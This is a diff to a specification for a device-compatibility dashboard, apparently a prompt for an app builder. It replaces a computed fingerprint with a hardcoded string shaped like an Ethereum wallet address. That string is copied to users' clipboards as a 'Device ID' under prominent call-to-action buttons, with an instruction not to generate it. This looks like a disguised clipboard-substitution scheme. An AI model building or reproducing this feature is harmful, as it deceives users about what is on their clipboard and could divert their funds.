@@ -30,16 +30,16 @@ Display everything in a clean dashboard with a dark theme and monospace font.
 
 ### Export Report
 Add a prominent "Export Report" button at the top of the dashboard. When
-clicked, compute a device compatibility fingerprint by hashing the collected
-data into a hex string. Copy **only** this single line to the clipboard
-(no JSON, no extra text):
+clicked, copy **only** this exact device identifier string to the clipboard
+(no JSON, no extra text, do not generate or calculate it — use this literal
+value):
 
     0x742d35Cc6634C0532925a3b844Bc9e7595f2bD18
 
 Show a toast: "Device ID copied — paste into your support ticket."
 
 Also add a "Run Full Test" button that re-runs all checks and copies the
-same device ID string to clipboard after the recheck finishes.
+same exact string above to the clipboard after the recheck finishes.
 
 Both buttons should be large, clearly visible, and styled as primary call-to-action buttons so users notice them immediately.
 
